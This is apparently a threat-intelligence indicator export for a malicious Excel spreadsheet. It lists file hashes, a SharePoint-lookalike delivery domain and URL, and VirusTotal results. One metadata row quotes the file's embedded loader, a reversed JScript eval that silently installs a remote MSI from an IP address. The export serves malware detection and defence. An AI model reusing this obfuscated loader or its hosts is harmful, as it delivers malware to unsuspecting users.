uuid,event_id,category,type,value,comment,to_ids,date,object_relation,attribute_tag,object_uuid,object_name,object_meta_category
"388ad923-3f8b-47d8-8f62-c143d8695aaf",62235,"Payload delivery","filename","CL09302021_00137.xls","",0,1633018937,"","","","",""
"c77ce3da-017d-461a-9cb7-988cd3561b60",62235,"Payload delivery","md5","deaad3ea1c708cd99e41c4043169aa4d","",1,1633018937,"","","","",""
"c34bda80-fcbb-497b-8571-7a402967fd5e",62235,"Payload delivery","sha1","f01d47b24b74ff5926efc1b6bacbc922d887fd30","",1,1633018937,"","","","",""
"6d44f59a-e45b-40ab-a4e7-48965e15c285",62235,"Payload delivery","sha256","28221d5ed7a6b37a4a0e5be77a9137378b1b6ca850c6327b77eae7a2b4437c96","",1,1633018937,"","","","",""
"1f6a8e00-59a6-472c-b67f-5f4a89236447",62235,"Payload delivery","mime-type","Composite Document File V2 Document, Little Endian, O%WINDIR%\ Version 10.0, Code page: 1251, Subject: JScript, Author: Ferop, Comments: eval('})""53.502.831.551//:ptth""(tcudorPllatsnI;2=leveLIU{))""rellatsnI.rellatsnIswodniW""(tcejbOXevitcA wen(htiw'.split('').reverse().join('')), Last Saved By: Arcadia, Name of Creating Application: Microsoft Excel, Create Time/Date: Tue Aug 17 13:24:08 2021, Last Saved Time/Date: Thu Sep 30 06:22:38 2021, Security: 0","",0,1633018937,"","","","",""
"83777f50-2af1-4f7d-8c75-9748ed2cdbfc",62235,"Network activity","url","https://cdn-8846-sharepoint-office.com/CL09302021_00137.xls","",1,1633018937,"","","","",""
"dfb90026-bc78-4ef9-8791-cd5ac21a84c9",62235,"Network activity","domain","cdn-8846-sharepoint-office.com","",1,1633018937,"","","","",""
"4d9b0e42-4435-48f6-a5da-aaf90fad8f8c",62235,"Payload delivery","filename","CL09302021_001.xls","",0,1633078571,"","","","",""
"556099d1-58ad-4778-ba9b-3b2bc461c01d",62235,"External analysis","link","https://www.virustotal.com/gui/file/28221d5ed7a6b37a4a0e5be77a9137378b1b6ca850c6327b77eae7a2b4437c96/detection","",0,1633018938,"permalink","","d0679b33-fbc8-4b6c-a36c-c995dcfeac7e","virustotal-report","misc"
"0d92c19c-7b4d-4f00-b47c-f16b6a0d2b82",62235,"Other","datetime","2021-09-30T15:10:46.000000+0000","",0,1633018938,"last-submission","","d0679b33-fbc8-4b6c-a36c-c995dcfeac7e","virustotal-report","misc"
"76998b19-bdc0-4682-87ca-6ac1e8a3c59d",62235,"Other","text","22/60","",0,1633018938,"detection-ratio","","d0679b33-fbc8-4b6c-a36c-c995dcfeac7e","virustotal-report","misc"

